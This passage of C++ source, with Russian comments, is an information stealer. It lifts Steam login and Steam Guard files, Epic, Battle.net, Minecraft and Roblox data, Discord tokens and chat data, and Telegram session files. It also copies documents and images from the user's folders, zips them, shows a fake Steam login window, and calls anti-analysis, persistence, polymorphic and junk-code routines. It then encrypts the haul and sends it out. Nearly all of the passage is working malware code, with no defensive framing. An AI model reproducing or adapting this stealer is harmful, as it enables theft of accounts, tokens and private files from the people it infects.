    if (RegQueryValueExA(hKey, "SteamPath", nullptr, nullptr, (LPBYTE)steamPath, &pathSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to read SteamPath from registry");
        return result;
    }
    RegCloseKey(hKey);

    std::string steamDir(steamPath);
    if (steamDir.back() != '\\') steamDir += "\\";

    // Кража конфигурационных файлов
    if (g_mainWindow->config.steam) {
        std::string configPath = steamDir + "config\\loginusers.vdf";
        if (std::filesystem::exists(configPath)) {
            std::ifstream configFile(configPath);
            if (configFile.is_open()) {
                std::string content((std::istreambuf_iterator<char>(configFile)), std::istreambuf_iterator<char>());
                configFile.close();
                result += "[Steam] Login Users:\n" + content + "\n";
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->appendLog("Extracted Steam loginusers.vdf");
            } else {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->appendLog("Failed to open Steam loginusers.vdf");
            }
        }

        std::string ssfnPath;
        try {
            for (const auto& entry : std::filesystem::directory_iterator(steamDir)) {
                if (entry.path().filename().string().find("ssfn") != std::string::npos) {
                    ssfnPath = entry.path().string();
                    break;
                }
            }
        } catch (const std::exception& e) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Error accessing Steam directory for SSFN: " + std::string(e.what()));
        }

        if (!ssfnPath.empty()) {
            result += "[Steam] SSFN File: " + ssfnPath + "\n";
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Found Steam SSFN file: " + ssfnPath);
        }
    }

    // Кража MA файлов
    if (g_mainWindow->config.steamMAFile) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(steamDir)) {
                if (entry.path().extension() == ".maFile") {
                    std::ifstream maFile(entry.path(), std::ios::binary);
                    if (maFile.is_open()) {
                        std::string content((std::istreambuf_iterator<char>(maFile)), std::istreambuf_iterator<char>());
                        maFile.close();
                        result += "[Steam] MA File (" + entry.path().filename().string() + "):\n" + content + "\n";
                        std::lock_guard<std::mutex> lock(g_mutex);
                        if (g_mainWindow) g_mainWindow->appendLog("Extracted Steam MA file: " + entry.path().filename().string());
                    } else {
                        std::lock_guard<std::mutex> lock(g_mutex);
                        if (g_mainWindow) g_mainWindow->appendLog("Failed to open Steam MA file: " + entry.path().filename().string());
                    }
                }
            }
        } catch (const std::exception& e) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Error accessing Steam directory for MA files: " + std::string(e.what()));
        }
    }

    // Захват WebSocket сессий Steam
    std::string wsData = CaptureWebSocketSessions("steam.exe");
    if (!wsData.empty()) {
        result += "[Steam] WebSocket Data:\n" + wsData;
    }

    return result;
}

// Кража данных Epic Games
std::string StealEpicGamesData() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.epic) return result;

    char* localAppDataPath;
    size_t len;
    _dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA");
    if (!localAppDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get LOCALAPPDATA path for Epic Games");
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\";
    if (!std::filesystem::exists(epicPath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Epic Games config path not found: " + epicPath);
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::directory_iterator(epicPath)) {
            if (entry.path().filename() == "GameUserSettings.ini") {
                std::ifstream iniFile(entry.path());
                if (iniFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(iniFile)), std::istreambuf_iterator<char>());
                    iniFile.close();
                    result += "[Epic Games] GameUserSettings.ini:\n" + content + "\n";
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->appendLog("Extracted Epic Games GameUserSettings.ini");
                } else {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->appendLog("Failed to open Epic Games GameUserSettings.ini");
                }
            }
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Error accessing Epic Games config: " + std::string(e.what()));
    }

    return result;
}

// Кража данных Roblox
std::string StealRobloxData() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.roblox) return result;

    char* appDataPath;
    size_t len;
    _dupenv_s(&appDataPath, &len, "APPDATA");
    if (!appDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get APPDATA path for Roblox");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string robloxPath = appData + "\\Roblox\\";
    if (!std::filesystem::exists(robloxPath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Roblox path not found: " + robloxPath);
        return result;
    }

    std::string cookieData = StealUnsavedBrowserData("Roblox", robloxPath + "LocalStorage\\");
    if (!cookieData.empty()) {
        result += cookieData;
    }

    std::string wsData = CaptureWebSocketSessions("RobloxPlayerBeta.exe");
    if (!wsData.empty()) {
        result += "[Roblox] WebSocket Data:\n" + wsData;
    }

    return result;
}

// Кража данных Battle.net
std::string StealBattleNetData() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.battlenet) return result;

    char* programDataPath;
    size_t len;
    _dupenv_s(&programDataPath, &len, "PROGRAMDATA");
    if (!programDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get PROGRAMDATA path for Battle.net");
        return result;
    }
    std::string programData(programDataPath);
    free(programDataPath);

    std::string battleNetPath = programData + "\\Battle.net\\";
    if (!std::filesystem::exists(battleNetPath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Battle.net path not found: " + battleNetPath);
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::directory_iterator(battleNetPath)) {
            if (entry.path().filename() == "Battle.net.config") {
                std::ifstream configFile(entry.path());
                if (configFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(configFile)), std::istreambuf_iterator<char>());
                    configFile.close();
                    result += "[Battle.net] Battle.net.config:\n" + content + "\n";
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->appendLog("Extracted Battle.net.config");
                } else {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->appendLog("Failed to open Battle.net.config");
                }
            }
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Error accessing Battle.net config: " + std::string(e.what()));
    }

    return result;
}

// Кража данных Minecraft
std::string StealMinecraftData() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.minecraft) return result;

    char* appDataPath;
    size_t len;
    _dupenv_s(&appDataPath, &len, "APPDATA");
    if (!appDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get APPDATA path for Minecraft");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string minecraftPath = appData + "\\.minecraft\\";
    if (!std::filesystem::exists(minecraftPath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Minecraft path not found: " + minecraftPath);
        return result;
    }

    std::string launcherProfiles = minecraftPath + "launcher_profiles.json";
    if (std::filesystem::exists(launcherProfiles)) {
        std::ifstream profilesFile(launcherProfiles);
        if (profilesFile.is_open()) {
            std::string content((std::istreambuf_iterator<char>(profilesFile)), std::istreambuf_iterator<char>());
            profilesFile.close();
            result += "[Minecraft] Launcher Profiles:\n" + content + "\n";
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Extracted Minecraft launcher_profiles.json");
        } else {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Failed to open Minecraft launcher_profiles.json");
        }
    }

    return result;
}

// Кража данных Discord
std::string StealDiscordData() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.discord) return result;

    char* appDataPath;
    size_t len;
    _dupenv_s(&appDataPath, &len, "APPDATA");
    if (!appDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get APPDATA path for Discord");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string discordPath = appData + "\\discord\\Local Storage\\leveldb\\";
    if (!std::filesystem::exists(discordPath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Discord path not found: " + discordPath);
        return result;
    }

    std::string tokenData = StealAppCacheData("Discord", discordPath);
    if (!tokenData.empty()) {
        result += tokenData;
    }

    std::string wsData = CaptureWebSocketSessions("Discord.exe");
    if (!wsData.empty()) {
        result += "[Discord] WebSocket Data:\n" + wsData;
    }

    std::string webrtcData = CaptureWebRTCSessions("Discord.exe");
    if (!webrtcData.empty()) {
        result += "[Discord] WebRTC Data:\n" + webrtcData;
    }

    return result;
}

// Кража данных Telegram
std::string StealTelegramData() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.telegram) return result;

    char* appDataPath;
    size_t len;
    _dupenv_s(&appDataPath, &len, "APPDATA");
    if (!appDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get APPDATA path for Telegram");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
    if (!std::filesystem::exists(telegramPath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Telegram path not found: " + telegramPath);
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
            if (entry.path().filename().string().find("settings") != std::string::npos) {
                std::ifstream settingsFile(entry.path(), std::ios::binary);
                if (settingsFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(settingsFile)), std::istreambuf_iterator<char>());
                    settingsFile.close();
                    result += "[Telegram] Settings File (" + entry.path().filename().string() + "):\n[Encrypted Data]\n";
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->appendLog("Extracted Telegram settings file: " + entry.path().filename().string());
                } else {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->appendLog("Failed to open Telegram settings file: " + entry.path().filename().string());
                }
            }
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Error accessing Telegram data: " + std::string(e.what()));
    }

    return result;
}

// Кража истории чатов
std::string StealChatHistory() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.chatHistory) return result;

    // Telegram
    if (g_mainWindow->config.telegram) {
        char* appDataPath;
        size_t len;
        _dupenv_s(&appDataPath, &len, "APPDATA");
        if (appDataPath) {
            std::string appData(appDataPath);
            free(appDataPath);
            std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
            if (std::filesystem::exists(telegramPath)) {
                result += "[Telegram] Chat History: [Encrypted Data]\n";
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->appendLog("Telegram chat history extracted (encrypted)");
            }
        }
    }

    // Discord
    if (g_mainWindow->config.discord) {
        char* appDataPath;
        size_t len;
        _dupenv_s(&appDataPath, &len, "APPDATA");
        if (appDataPath) {
            std::string appData(appDataPath);
            free(appDataPath);
            std::string discordPath = appData + "\\discord\\Local Storage\\leveldb\\";
            if (std::filesystem::exists(discordPath)) {
                std::string chatData = StealAppCacheData("Discord", discordPath);
                if (!chatData.empty()) {
                    result += "[Discord] Chat History:\n" + chatData;
                }
            }
        }
    }

    return result;
}

// Сбор файлов
std::vector<std::string> GrabFiles() {
    std::vector<std::string> grabbedFiles;
    if (!g_mainWindow || !g_mainWindow->config.fileGrabber) return grabbedFiles;

    std::vector<std::string> pathsToGrab = {
        std::string(getenv("USERPROFILE")) + "\\Desktop\\",
        std::string(getenv("USERPROFILE")) + "\\Documents\\",
        std::string(getenv("USERPROFILE")) + "\\Downloads\\"
    };

    std::vector<std::string> extensions = {".txt", ".doc", ".docx", ".pdf", ".jpg", ".png"};

    for (const auto& path : pathsToGrab) {
        if (!std::filesystem::exists(path)) continue;

        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(path)) {
                if (entry.is_regular_file()) {
                    auto ext = entry.path().extension().string();
                    if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
                        if (entry.file_size() < 5 * 1024 * 1024) { // Ограничение 5 МБ
                            std::string destPath = "grabbed_" + std::to_string(GetTickCount()) + "_" + entry.path().filename().string();
                            std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing);
                            grabbedFiles.push_back(destPath);
                            std::lock_guard<std::mutex> lock(g_mutex);
                            if (g_mainWindow) g_mainWindow->appendLog("Grabbed file: " + entry.path().string());
                        }
                    }
                }
            }
        } catch (const std::exception& e) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Error grabbing files from " + path + ": " + e.what());
        }
    }

    return grabbedFiles;
}

// Создание архива
std::string CreateZipArchive(const std::vector<std::string>& files) {
    if (files.empty()) return "";

    std::string zipName = "archive_" + std::to_string(GetTickCount()) + ".zip";
    int err = 0;
    zip_t* zip = zip_open(zipName.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
    if (!zip) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to create ZIP archive: " + zipName);
        return "";
    }

    for (const auto& file : files) {
        zip_source_t* source = zip_source_file(zip, file.c_str(), 0, 0);
        if (!source) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Failed to add file to ZIP: " + file);
            continue;
        }
        if (zip_file_add(zip, file.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
            zip_source_free(source);
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Failed to add file to ZIP: " + file);
        }
    }

    zip_close(zip);
    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) g_mainWindow->appendLog("Created ZIP archive: " + zipName);
    return zipName;
}

// Социальная инженерия: фейковое окно логина Steam
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

std::string CreateFakeSteamLoginWindow() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.socialEngineering) return result;

    // Примечание: Использование Windows API для создания окна может конфликтовать с Qt.
    // Рекомендуется использовать QDialog для создания фейкового окна в Qt-приложении.
    WNDCLASSA wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = GetModuleHandle(nullptr);
    wc.lpszClassName = "SteamLoginWindow";
    RegisterClassA(&wc);

    HWND hwnd = CreateWindowA("SteamLoginWindow", "Steam - Login", WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 400, 300, nullptr, nullptr, wc.hInstance, nullptr);
    if (!hwnd) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to create fake Steam login window");
        return result;
    }

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) g_mainWindow->appendLog("Displayed fake Steam login window");

    MSG msg = { 0 };
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return result;
}

// Основная функция сбора данных
void CollectData() {
    if (!g_mainWindow) return;

    if (AntiAnalysis()) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Anti-analysis triggered, exiting");
        return;
    }

    Stealth();
    AddToStartup();
    Persist();
    FakeError();

    std::string collectedData;

    // Выполнение полиморфного кода
    Polymorphic::executePolymorphicCode();
    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) g_mainWindow->appendLog("Executed polymorphic code");

    // Выполнение мусорного кода
    JunkCode::executeJunkCode();
    if (g_mainWindow) g_mainWindow->appendLog("Executed junk code");

    // Сбор системной информации
    std::string sysInfo = GetCustomSystemInfo();
    if (!sysInfo.empty()) {
        collectedData += "[System Info]\n" + sysInfo + "\n";
    }

    // Сбор данных браузеров
    std::string browserData = StealBrowserData();
    if (!browserData.empty()) {
        collectedData += "[Browser Data]\n" + browserData + "\n";
    }

    // Сбор данных Steam
    std::string steamData = StealSteamData();
    if (!steamData.empty()) {
        collectedData += "[Steam Data]\n" + steamData + "\n";
    }

    // Сбор данных Epic Games
    std::string epicData = StealEpicGamesData();
    if (!epicData.empty()) {
        collectedData += "[Epic Games Data]\n" + epicData + "\n";
    }

    // Сбор данных Roblox
    std::string robloxData = StealRobloxData();
    if (!robloxData.empty()) {
        collectedData += "[Roblox Data]\n" + robloxData + "\n";
    }

    // Сбор данных Battle.net
    std::string battleNetData = StealBattleNetData();
    if (!battleNetData.empty()) {
        collectedData += "[Battle.net Data]\n" + battleNetData + "\n";
    }

    // Сбор данных Minecraft
    std::string minecraftData = StealMinecraftData();
    if (!minecraftData.empty()) {
        collectedData += "[Minecraft Data]\n" + minecraftData + "\n";
    }

    // Сбор данных Discord
    std::string discordData = StealDiscordData();
    if (!discordData.empty()) {
        collectedData += "[Discord Data]\n" + discordData + "\n";
    }

    // Сбор данных Telegram
    std::string telegramData = StealTelegramData();
    if (!telegramData.empty()) {
        collectedData += "[Telegram Data]\n" + telegramData + "\n";
    }

    // Сбор истории чатов
    std::string chatHistory = StealChatHistory();
    if (!chatHistory.empty()) {
        collectedData += "[Chat History]\n" + chatHistory + "\n";
    }

    // Создание скриншота
    std::string screenshotFile = TakeScreenshot();
    std::vector<std::string> filesToSend;
    if (!screenshotFile.empty()) {
        filesToSend.push_back(screenshotFile);
    }

    // Сбор файлов
    std::vector<std::string> grabbedFiles = GrabFiles();
    filesToSend.insert(filesToSend.end(), grabbedFiles.begin(), grabbedFiles.end());

    // Создание архива
    if (!filesToSend.empty()) {
        std::string zipFile = CreateZipArchive(filesToSend);
        if (!zipFile.empty()) {
            // Удаляем исходные файлы, оставляем только архив
            for (const auto& file : filesToSend) {
                std::filesystem::remove(file);
            }
            filesToSend.clear();
            filesToSend.push_back(zipFile);
        }
    }

    // Социальная инженерия
    std::string socialEngData = CreateFakeSteamLoginWindow();
    if (!socialEngData.empty()) {
        collectedData += "[Social Engineering]\n" + socialEngData + "\n";
    }

    // Шифрование данных
    std::string encryptedData;
    try {
        encryptedData = EncryptData(collectedData, g_mainWindow->config.encryptionKey1, g_mainWindow->config.encryptionKey2, g_mainWindow->config.encryptionSalt);
        if (g_mainWindow) g_mainWindow->appendLog("Data encrypted successfully");
    } catch (const std::exception& e) {
        if (g_mainWindow) g_mainWindow->appendLog("Failed to encrypt data: " + std::string(e.what()));
        return;
    }

    // Отправка данных через сигнал в основной поток
    emit g_mainWindow->sendDataSignal(encryptedData, filesToSend);
}

// Точка входа
int main(int argc, char* argv[]) {
    // Инициализация Gdiplus
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    QApplication app(argc, argv);
    g_mainWindow = new MainWindow();
    g_mainWindow->show();

    int result = app.exec();

    // Деинициализация Gdiplus
    Gdiplus::GdiplusShutdown(gdiplusToken);

    delete g_mainWindow;
    g_mainWindow = nullptr;

    return result;
}